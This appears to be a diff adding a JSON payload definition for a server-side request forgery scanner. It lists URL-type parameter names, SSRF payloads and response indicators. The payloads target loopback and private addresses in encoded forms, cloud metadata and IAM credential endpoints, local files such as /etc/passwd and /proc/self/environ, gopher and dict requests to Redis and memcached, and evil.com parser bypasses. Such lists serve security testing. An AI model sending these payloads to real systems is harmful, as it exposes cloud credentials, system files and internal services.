@@ -1,0 +1,79 @@
+{
+"meta": {
+"name": "Server-Side Request Forgery",
+"category": "SSRF",
+"cwe": "CWE-918",
+"wasc": "WASC-40",
+"reference": "https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/"
+},
+
+"ssrf_params": [
+"url","uri","src","source","href","path","file",
+"load","fetch","open","proxy","host","target",
+"img","image","link","callback","webhook","endpoint",
+"service","api_url","base_url","resource","dest",
+"destination","redirect","forward","next","data",
+"reference","site","html","domain","feed","out"
+],
+
+"payloads": [
+
+{ "value": "http://127.0.0.1/" },
+{ "value": "http://localhost/" },
+{ "value": "http://0.0.0.0/" },
+{ "value": "http://[::1]/" },
+
+{ "value": "http://2130706433/" },
+{ "value": "http://0x7f000001/" },
+{ "value": "http://0177.0.0.1/" },
+
+{ "value": "http://169.254.169.254/latest/meta-data/" },
+{ "value": "http://169.254.169.254/latest/user-data/" },
+
+{ "value": "http://metadata.google.internal/computeMetadata/v1/" },
+
+{ "value": "http://100.100.100.200/latest/meta-data/" },
+
+{ "value": "http://169.254.169.254/metadata/instance?api-version=2021-02-01" },
+
+{ "value": "file:///etc/passwd" },
+{ "value": "file:///proc/self/environ" },
+
+{ "value": "file:///windows/win.ini" },
+
+{ "value": "gopher://127.0.0.1:6379/_PING" },
+
+{ "value": "dict://127.0.0.1:11211/" },
+
+{ "value": "http://127.0.0.1@evil.com/" },
+{ "value": "http://evil.com@127.0.0.1/" },
+
+{ "value": "http://127.0.0.1%00.evil.com" },
+
+{ "value": "http://127.0.0.1.xip.io/" },
+
+{ "value": "http://10.0.0.1/" },
+{ "value": "http://192.168.1.1/" },
+{ "value": "http://172.16.0.1/" },
+
+{ "value": "//127.0.0.1" }
+
+],
+
+"indicators": [
+"root:x:0:0",
+"AMI-ID",
+"instance-id",
+"computeMetadata",
+"metadata.google",
+"iam/security-credentials",
+"local-ipv4",
+"ami-launch-index",
+"redis_version",
+"uid=",
+"gid=",
+"MemTotal",
+"processor",
+"Windows Registry Editor"
+]
+}
